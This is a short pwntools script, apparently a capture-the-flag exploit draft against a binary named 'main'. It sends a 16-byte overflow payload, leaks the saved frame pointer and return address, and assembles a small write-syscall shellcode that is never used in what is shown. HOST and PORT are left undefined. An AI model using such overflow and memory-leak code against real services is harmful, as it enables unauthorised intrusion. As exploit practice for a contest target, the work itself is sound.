from pwn import *

context.binary = elf = ELF('./main')
context.arch = "amd64"
context.log_level = "debug"

def slog(n, a): return success(': '.join([n, hex(a)]))

if args.REMOTE:
    p = remote(HOST, PORT)
else:
    p = remote('localhost', 80)
    # p = process()
sc = r'''
mov rdx, 0x30
mov rsi, [rbp-0x8]
mov rdi, 1
mov rax, 1
syscall
'''

sc = asm(sc)
pay = b'A'*0x10
p.sendafter(b'> ', pay)
p.recv(8) # buf
sfp = u64(p.recv(8)) # sfp
ret = u64(p.recv(8)) # ret

slog("sfp", sfp)
slog("ret", ret)

p.interactive()